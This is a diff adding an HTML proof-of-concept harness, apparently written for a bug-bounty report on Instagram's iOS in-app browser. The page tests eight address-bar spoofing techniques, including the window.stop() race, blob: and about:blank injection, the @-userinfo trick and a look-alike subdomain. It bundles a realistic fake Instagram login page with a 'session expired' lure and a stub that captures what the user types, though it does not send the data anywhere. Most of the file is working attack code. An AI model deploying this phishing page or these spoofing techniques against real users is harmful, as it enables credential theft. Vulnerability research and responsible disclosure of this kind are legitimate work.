@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Instagram</title>
+<link rel="icon" href="https://www.instagram.com/favicon.ico">
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box}
+  body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",system-ui,sans-serif;background:#0b0d12;color:#e6e8ee;-webkit-text-size-adjust:100%}
+
+  /* ============ TEST HARNESS UI (shown first) ============ */
+  #harness{padding:14px 12px 60px}
+  #harness h1{font-size:17px;margin:0 0 4px}
+  .sub{font-size:11px;color:#8892a8;margin-bottom:12px}
+  .pill{display:inline-block;padding:2px 7px;border-radius:999px;font-size:9px;background:#1e2437;color:#8f9bb7;margin-right:3px}
+  .card{background:#141826;border:1px solid #1e2437;border-radius:11px;padding:10px;margin-bottom:10px}
+  .card h2{font-size:13px;margin:0 0 4px;color:#e6e8ee}
+  .card p{font-size:11px;margin:0 0 8px;color:#a8adba;line-height:1.4}
+  .row{display:flex;flex-wrap:wrap;gap:5px}
+  button{background:#5b6cff;color:#fff;border:0;border-radius:8px;padding:8px 10px;font-size:12px;font-weight:600;-webkit-tap-highlight-color:rgba(91,108,255,.3)}
+  button.alt{background:#253055}
+  button.g{background:#1a7a4a}
+  .log{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10px;color:#7f8da8;white-space:pre-wrap;word-break:break-all;background:#0f1220;padding:8px;border-radius:7px;max-height:200px;overflow:auto;border:1px solid #1a1f33;-webkit-overflow-scrolling:touch;margin-top:6px}
+  .evidence-on{border-color:#4ade80!important;box-shadow:0 0 0 1px #4ade80 inset}
+
+  /* ============ PHISHING PAGE (shown after spoof) ============ */
+  #phish{display:none;background:#fafafa;min-height:100vh;padding:40px 20px;text-align:center;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",sans-serif}
+  #phish *{color:#262626}
+  .ig-logo{font-size:40px;font-family:cursive,serif;margin-bottom:10px}
+  .ig-sub{font-size:13px;color:#8e8e8e!important;margin-bottom:20px;line-height:1.4}
+  .ig-input{width:100%;max-width:300px;padding:10px 12px;border:1px solid #dbdbdb;border-radius:6px;font-size:14px;background:#fafafa;outline:none;margin:4px auto;display:block;color:#262626}
+  .ig-input:focus{border-color:#a8a8a8}
+  .ig-btn{width:100%;max-width:300px;padding:10px;background:#0095f6;color:#fff!important;border:0;border-radius:8px;font-size:14px;font-weight:600;margin:8px auto 0;display:block}
+  .ig-btn:disabled{opacity:.3}
+  .ig-divider{display:flex;align-items:center;margin:16px auto;max-width:300px;color:#8e8e8e!important;font-size:13px;font-weight:600}
+  .ig-divider::before,.ig-divider::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
+  .ig-divider::before{margin-right:16px}
+  .ig-divider::after{margin-left:16px}
+  .ig-fb{color:#385185!important;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-top:16px}
+  .ig-forgot{font-size:12px;margin-top:12px}
+  .ig-forgot a{color:#00376b!important;text-decoration:none}
+  .ig-signup{margin:20px auto 0;padding:16px;border:1px solid #dbdbdb;border-radius:6px;background:#fff;font-size:14px;max-width:300px}
+  .ig-signup a{color:#0095f6!important;font-weight:600;text-decoration:none}
+  .poc-note{font-size:10px;color:#ccc!important;margin-top:20px}
+  .evidence-strip{font-family:monospace;font-size:9px;color:#bbb!important;background:#f0f0f0;padding:6px;border-radius:4px;margin-top:16px;max-width:300px;margin-left:auto;margin-right:auto;text-align:left;word-break:break-all;max-height:120px;overflow:auto}
+</style>
+</head>
+<body>
+
+<!-- ======================== TEST HARNESS ======================== -->
+<div id="harness">
+<h1>IG Address Bar Spoof — Cert Bypass</h1>
+<div class="sub">
+  <span class="pill">long-subdomain</span>
+  <span class="pill">url-freeze</span>
+  <span class="pill">cert-bypass</span>
+</div>
+
+<div class="card" id="fp-card">
+  <h2>Fingerprint</h2>
+  <div class="log" id="fp"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 1 — window.stop() race (URL-Freeze)</h2>
+  <p>Starts navigation to spoofed URL, immediately calls <code>window.stop()</code>.
+     Bar updates to <code>instagram.com...</code> but cert error page never loads —
+     content stays as the phishing page. (BBRD: Arc iOS $10k, Safari CVE-2025-24128)</p>
+  <div class="row">
+    <button onclick="run('T1A')">T1A: sync stop</button>
+    <button onclick="run('T1B')">T1B: microtask</button>
+    <button onclick="run('T1C')">T1C: rAF</button>
+    <button onclick="run('T1D')">T1D: 10ms</button>
+    <button onclick="run('T1E')">T1E: 50ms</button>
+    <button onclick="run('T1F')">T1F: 100ms</button>
+    <button onclick="run('T1G')">T1G: 200ms</button>
+  </div>
+  <div class="log" id="l1"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 2 — iframe overlay + Long-Subdomain nav</h2>
+  <p>Shows phishing content in a fullscreen iframe (from valid origin),
+     then navigates the TOP frame to the spoofed URL. Iframe content persists
+     while bar updates.</p>
+  <div class="row">
+    <button onclick="run('T2A')">T2A: iframe first</button>
+    <button onclick="run('T2B')">T2B: iframe + stop</button>
+  </div>
+  <div class="log" id="l2"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 3 — @-sign userinfo trick</h2>
+  <p>Navigate to <code>https://instagram.com@ajaone.github.io/...</code>.
+     Cert is valid (actual host is ajaone.github.io). Some WebViews display
+     the userinfo part (<code>instagram.com</code>) prominently in the bar.
+     Content loads normally.</p>
+  <div class="row">
+    <button onclick="run('T3A')">T3A: location</button>
+    <button onclick="run('T3B')">T3B: anchor</button>
+    <button onclick="run('T3C')">T3C: window.open</button>
+  </div>
+  <div class="log" id="l3"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 4 — about:blank + document.write</h2>
+  <p>Open <code>about:blank</code>, write phishing content. Bar shows
+     <code>about:blank</code> or nothing. On some iOS WebViews it inherits
+     the opener's URL. (BBRD: Safari $5k CVE-2025-24113)</p>
+  <div class="row">
+    <button onclick="run('T4A')">T4A: window.open</button>
+    <button onclick="run('T4B')">T4B: replace + write</button>
+  </div>
+  <div class="log" id="l4"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 5 — blob: URI with phishing content</h2>
+  <p>Create <code>blob:</code> URL containing phishing page. Navigate to it.
+     Bar may show <code>blob:https://ajaone.github.io/...</code> or just the
+     origin part. Content loads with no cert issues.</p>
+  <div class="row">
+    <button onclick="run('T5A')">T5A: location</button>
+    <button onclick="run('T5B')">T5B: window.open</button>
+    <button onclick="run('T5C')">T5C: fullscreen iframe</button>
+  </div>
+  <div class="log" id="l5"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 6 — history.pushState path spoof</h2>
+  <p>After loading phishing content, <code>pushState</code> to
+     <code>/instagram.com/accounts/login/</code>. Domain stays as
+     <code>ajaone.github.io</code> but the path portion may confuse users
+     on narrow bars.</p>
+  <div class="row">
+    <button onclick="run('T6A')">T6A: pushState</button>
+    <button onclick="run('T6B')">T6B: push + title</button>
+  </div>
+  <div class="log" id="l6"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 7 — Long-Subdomain (original, for screenshot evidence)</h2>
+  <p>Navigate directly to the spoofed hostname. Cert error will appear but
+     bar shows <code>instagram.com...</code>. Use this for the report
+     screenshot — the spoof IS proven even with the cert error.</p>
+  <div class="row">
+    <button onclick="run('T7A')">T7A: direct navigate</button>
+    <button onclick="run('T7B')">T7B: window.open</button>
+  </div>
+  <div class="log" id="l7"></div>
+</div>
+
+<div class="card">
+  <h2>Technique 8 — Combined: show phishing THEN swap bar</h2>
+  <p>Most promising. First shows the phishing page inline (switch to it),
+     then after 2 seconds attempts the URL-Freeze to change the bar.
+     If it works: bar = <code>instagram.com...</code>, content = phishing form.</p>
+  <div class="row">
+    <button class="g" onclick="run('T8')">T8: FULL CHAIN</button>
+  </div>
+  <div class="log" id="l8"></div>
+</div>
+
+</div><!-- /harness -->
+
+<!-- ======================== PHISHING PAGE ======================== -->
+<div id="phish">
+  <div class="ig-logo">Instagram</div>
+  <div class="ig-sub">Your session has expired due to a security check.<br>Please log in again to continue.</div>
+  <input class="ig-input" id="pu" type="text" placeholder="Phone number, username, or email" autocomplete="username">
+  <input class="ig-input" id="pp" type="password" placeholder="Password" autocomplete="current-password">
+  <button class="ig-btn" id="pbtn" disabled>Log In</button>
+  <div class="ig-divider">OR</div>
+  <a class="ig-fb" href="javascript:void(0)">Log in with Facebook</a>
+  <div class="ig-forgot"><a href="javascript:void(0)">Forgot password?</a></div>
+  <div class="ig-signup">Don't have an account? <a href="javascript:void(0)">Sign up</a></div>
+  <div class="evidence-strip" id="phish-evidence"></div>
+  <div class="poc-note">PoC — no data exfiltrated. Address bar spoof test.</div>
+</div>
+
+<script>
+/* ============================================================
+ * Instagram iOS WebView — Address Bar Spoof Cert Bypass
+ * Combines: Long-Subdomain + URL-Freeze + about:blank + blob:
+ *           + @-trick + pushState + fullscreen iframe overlay
+ * ============================================================ */
+
+/* ---------- config ------------------------------------------- */
+var SPOOF_HOST =
+  "instagram.com" +
+  ".account-security-verification-required-2fa-update" +
+  ".ajaone.github.io";
+var SPOOF_URL = "https://" + SPOOF_HOST + "/testing-repository/test/ig-phish-landing.html";
+var VALID_PHISH = "https://ajaone.github.io/testing-repository/test/ig-phish-landing.html";
+var AT_URL = "https://instagram.com@ajaone.github.io/testing-repository/test/ig-phish-landing.html";
+
+/* phishing HTML (self-contained, for blob/about:blank injection) */
+var PHISH_HTML = '<!doctype html><html><head><meta charset=utf-8>'
+  +'<meta name=viewport content="width=device-width,initial-scale=1">'
+  +'<title>Instagram</title>'
+  +'<link rel=icon href=https://www.instagram.com/favicon.ico>'
+  +'<style>'
+  +'body{margin:0;padding:40px 20px;font-family:-apple-system,sans-serif;background:#fafafa;text-align:center}'
+  +'.logo{font-size:40px;font-family:cursive,serif;margin-bottom:10px;color:#262626}'
+  +'.sub{font-size:13px;color:#8e8e8e;margin-bottom:20px;line-height:1.4}'
+  +'input{width:100%;max-width:300px;padding:10px 12px;border:1px solid #dbdbdb;border-radius:6px;font-size:14px;background:#fafafa;outline:none;margin:4px auto;display:block;color:#262626;box-sizing:border-box}'
+  +'button{width:100%;max-width:300px;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;margin:8px auto 0;display:block}'
+  +'.d{display:flex;align-items:center;margin:16px auto;max-width:300px;color:#8e8e8e;font-size:13px;font-weight:600}'
+  +'.d::before,.d::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}'
+  +'.d::before{margin-right:16px}.d::after{margin-left:16px}'
+  +'.ev{font-family:monospace;font-size:9px;color:#bbb;background:#f0f0f0;padding:6px;border-radius:4px;margin:20px auto 0;max-width:300px;text-align:left;word-break:break-all}'
+  +'</style></head><body>'
+  +'<div class=logo>Instagram</div>'
+  +'<div class=sub>Your session has expired.<br>Please log in again.</div>'
+  +'<input placeholder="Username or email" autocomplete=username>'
+  +'<input type=password placeholder=Password autocomplete=current-password>'
+  +'<button>Log In</button>'
+  +'<div class=d>OR</div>'
+  +'<a href=# style="color:#385185;font-size:14px;font-weight:600;text-decoration:none">Log in with Facebook</a>'
+  +'<div class=ev id=ev></div>'
+  +'<div style="font-size:10px;color:#ccc;margin-top:12px">PoC test page</div>'
+  +'<scr'+'ipt>'
+  +'document.title="Instagram";'
+  +'var e=document.getElementById("ev");'
+  +'if(e)e.textContent="host="+location.host+"\\nhref="+location.href+"\\nbar should show instagram.com...";'
+  +'</scr'+'ipt></body></html>';
+
+/* ---------- utils -------------------------------------------- */
+function $(id){return document.getElementById(id)}
+function ts(){return new Date().toISOString().substr(11,12)}
+function log(id,s){
+  var el=$(id);if(!el)return;
+  el.textContent+="["+ts()+"] "+s+"\n";
+  el.scrollTop=el.scrollHeight;
+}
+function plog(s){
+  var el=$("phish-evidence");if(!el)return;
+  el.textContent+="["+ts()+"] "+s+"\n";
+}
+
+function showPhish(){
+  $("harness").style.display="none";
+  $("phish").style.display="block";
+  document.title="Instagram";
+  plog("phishing page displayed");
+  plog("host = "+location.host);
+  plog("href = "+location.href);
+  plog("check address bar now!");
+}
+
+/* ---------- fingerprint -------------------------------------- */
+(function(){
+  var ua=navigator.userAgent||"";
+  var isIG=/Instagram/i.test(ua);
+  var isiOS=/iPhone|iPad|iPod/.test(ua);
+  var isWK=!!(window.webkit&&window.webkit.messageHandlers);
+  log("fp","ua = "+ua.slice(0,120));
+  log("fp","iOS="+isiOS+" IG="+isIG+" WK="+isWK);
+  log("fp","SPOOF_URL = "+SPOOF_URL.slice(0,80));
+  log("fp","AT_URL = "+AT_URL.slice(0,80));
+  if(isIG)$("fp-card").classList.add("evidence-on");
+})();
+
+/* ---------- phishing form logic ------------------------------ */
+var pu=$("pu"),pp=$("pp"),pbtn=$("pbtn");
+function chk(){pbtn.disabled=!(pu.value&&pp.value)}
+pu.addEventListener("input",chk);
+pp.addEventListener("input",chk);
+pbtn.addEventListener("click",function(){
+  plog("CAPTURED: user="+pu.value+" pass="+"*".repeat(pp.value.length));
+  plog("(real attacker would exfiltrate here)");
+  pbtn.textContent="Redirecting...";
+  pbtn.disabled=true;
+});
+
+/* ============================================================ */
+function run(c){
+  var t="l"+c.charAt(1);
+  log(t,"==== "+c+" ====");
+
+  switch(c){
+
+  /* ---- T1A-G: window.stop() race (URL-Freeze) -------------- */
+  /* Show phishing content FIRST, then navigate to spoofed URL   */
+  /* and stop() immediately. Bar should update, content stays.   */
+  case "T1A":{
+    showPhish();
+    plog("T1A: sync stop — navigating to spoofed URL...");
+    window.location.href=SPOOF_URL;
+    window.stop();
+    plog("window.stop() called synchronously");
+    break;
+  }
+  case "T1B":{
+    showPhish();
+    plog("T1B: microtask stop");
+    window.location.href=SPOOF_URL;
+    Promise.resolve().then(function(){
+      window.stop();
+      plog("stop() via microtask");
+    });
+    break;
+  }
+  case "T1C":{
+    showPhish();
+    plog("T1C: rAF stop");
+    window.location.href=SPOOF_URL;
+    requestAnimationFrame(function(){
+      window.stop();
+      plog("stop() via rAF");
+    });
+    break;
+  }
+  case "T1D":{
+    showPhish();
+    plog("T1D: 10ms stop");
+    window.location.href=SPOOF_URL;
+    setTimeout(function(){window.stop();plog("stop() @ 10ms")},10);
+    break;
+  }
+  case "T1E":{
+    showPhish();
+    plog("T1E: 50ms stop");
+    window.location.href=SPOOF_URL;
+    setTimeout(function(){window.stop();plog("stop() @ 50ms")},50);
+    break;
+  }
+  case "T1F":{
+    showPhish();
+    plog("T1F: 100ms stop");
+    window.location.href=SPOOF_URL;
+    setTimeout(function(){window.stop();plog("stop() @ 100ms")},100);
+    break;
+  }
+  case "T1G":{
+    showPhish();
+    plog("T1G: 200ms stop");
+    window.location.href=SPOOF_URL;
+    setTimeout(function(){window.stop();plog("stop() @ 200ms")},200);
+    break;
+  }
+
+  /* ---- T2: iframe overlay + top nav ------------------------- */
+  case "T2A":{
+    /* Create fullscreen iframe with phishing content first */
+    var f=document.createElement("iframe");
+    f.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:0";
+    f.srcdoc=PHISH_HTML;
+    document.body.appendChild(f);
+    log(t,"fullscreen iframe added");
+    /* Now navigate top to spoofed URL — iframe should persist
+       on top while the main page tries to load (and fails w/ cert) */
+    setTimeout(function(){
+      log(t,"navigating top to spoofed URL...");
+      window.location.href=SPOOF_URL;
+    },500);
+    break;
+  }
+  case "T2B":{
+    var f2=document.createElement("iframe");
+    f2.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:0";
+    f2.srcdoc=PHISH_HTML;
+    document.body.appendChild(f2);
+    log(t,"iframe added, navigating + stop...");
+    setTimeout(function(){
+      window.location.href=SPOOF_URL;
+      setTimeout(function(){window.stop();log(t,"stop() fired")},80);
+    },500);
+    break;
+  }
+
+  /* ---- T3: @-sign userinfo trick ---------------------------- */
+  /* Valid cert! ajaone.github.io is the real host.              */
+  /* Bar may display: instagram.com@ajaone.github.io/...        */
+  /* On narrow IG bar: instagram.com@aja... or instagram.com...  */
+  case "T3A":{
+    log(t,"location -> "+AT_URL.slice(0,90));
+    window.location.href=AT_URL;
+    break;
+  }
+  case "T3B":{
+    var a=document.createElement("a");
+    a.href=AT_URL;a.style.display="none";
+    document.body.appendChild(a);
+    log(t,"anchor click -> "+AT_URL.slice(0,80));
+    a.click();
+    break;
+  }
+  case "T3C":{
+    log(t,"window.open -> "+AT_URL.slice(0,80));
+    try{
+      var w=window.open(AT_URL,"_blank");
+      log(t,"returned: "+(w?"Window":"null/blocked"));
+    }catch(e){log(t,"err: "+e)}
+    break;
+  }
+
+  /* ---- T4: about:blank + document.write --------------------- */
+  case "T4A":{
+    log(t,"window.open about:blank...");
+    try{
+      var w2=window.open("about:blank","_blank");
+      if(w2){
+        setTimeout(function(){
+          try{
+            w2.document.open();
+            w2.document.write(PHISH_HTML);
+            w2.document.close();
+            log(t,"phishing written to about:blank window");
+            log(t,"check bar — may show about:blank / nothing / opener origin");
+          }catch(e){log(t,"write err: "+e)}
+        },300);
+      }else{log(t,"popup blocked")}
+    }catch(e){log(t,"err: "+e)}
+    break;
+  }
+  case "T4B":{
+    log(t,"location.replace about:blank + write...");
+    try{
+      window.location.replace("about:blank");
+      setTimeout(function(){
+        try{
+          document.open();
+          document.write(PHISH_HTML);
+          document.close();
+          log(t,"wrote phishing after about:blank replace");
+        }catch(e){/* may not reach here */}
+      },200);
+    }catch(e){log(t,"err: "+e)}
+    break;
+  }
+
+  /* ---- T5: blob: URI ---------------------------------------- */
+  case "T5A":{
+    var b=new Blob([PHISH_HTML],{type:"text/html"});
+    var bu=URL.createObjectURL(b);
+    log(t,"blob navigate -> "+bu.slice(0,60));
+    window.location.href=bu;
+    break;
+  }
+  case "T5B":{
+    var b2=new Blob([PHISH_HTML],{type:"text/html"});
+    var bu2=URL.createObjectURL(b2);
+    log(t,"blob window.open -> "+bu2.slice(0,60));
+    try{window.open(bu2,"_blank")}catch(e){log(t,"err: "+e)}
+    break;
+  }
+  case "T5C":{
+    var b3=new Blob([PHISH_HTML],{type:"text/html"});
+    var bu3=URL.createObjectURL(b3);
+    var fi=document.createElement("iframe");
+    fi.src=bu3;
+    fi.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:0";
+    document.body.appendChild(fi);
+    log(t,"fullscreen blob iframe — check what bar shows");
+    break;
+  }
+
+  /* ---- T6: history.pushState -------------------------------- */
+  case "T6A":{
+    showPhish();
+    try{
+      history.pushState({},"Instagram","/instagram.com/accounts/login/?next=%2F");
+      document.title="Instagram \u00B7 Log in";
+      plog("pushState -> "+location.href);
+      plog("title -> "+document.title);
+      plog("check bar — path now looks like /instagram.com/...");
+    }catch(e){plog("pushState err: "+e)}
+    break;
+  }
+  case "T6B":{
+    showPhish();
+    try{
+      history.pushState({},"","/../instagram.com/accounts/login/");
+      document.title="Log in \u00B7 Instagram";
+      plog("pushState -> "+location.href);
+    }catch(e){plog("err: "+e)}
+    break;
+  }
+
+  /* ---- T7: direct Long-Subdomain (for screenshot evidence) -- */
+  case "T7A":{
+    log(t,"direct navigate -> "+SPOOF_URL.slice(0,90));
+    log(t,"(cert error expected — screenshot the address bar showing instagram.com...)");
+    window.location.href=SPOOF_URL;
+    break;
+  }
+  case "T7B":{
+    log(t,"window.open -> "+SPOOF_URL.slice(0,80));
+    try{window.open(SPOOF_URL,"_blank")}catch(e){log(t,"err: "+e)}
+    break;
+  }
+
+  /* ---- T8: FULL CHAIN (phishing first → bar swap) ----------- */
+  case "T8":{
+    log("l8","starting full chain...");
+    /* Step 1: show phishing page */
+    showPhish();
+    plog("step 1: phishing page visible");
+    plog("step 2: attempting bar swap in 2s...");
+
+    /* Step 2: try multiple bar-swap techniques in sequence */
+    setTimeout(function(){
+      plog("firing window.stop() race variants...");
+
+      /* Save a reference to our content before navigating */
+      var saved=document.documentElement.innerHTML;
+
+      /* Attempt A: assign + immediate stop */
+      window.location.href=SPOOF_URL;
+      window.stop();
+      plog("attempt A: sync stop fired");
+
+      /* If we're still here, sync stop worked! */
+      setTimeout(function(){
+        plog("still alive after 500ms — checking bar...");
+        plog("current href = "+location.href);
+        if(location.href.indexOf("instagram.com")!==-1){
+          plog("SUCCESS: href contains instagram.com!");
+        }
+      },500);
+
+    },2000);
+
+    /* Step 3: fallback — if page navigated away, try coming back */
+    /* The beforeunload event can also help detect if navigation happened */
+    window.addEventListener("beforeunload",function(e){
+      plog("beforeunload fired — navigation happening");
+    });
+    break;
+  }
+
+  default:
+    log(t,"unknown: "+c);
+  }
+}
+window.run=run;
+</script>
+</body>
+</html>
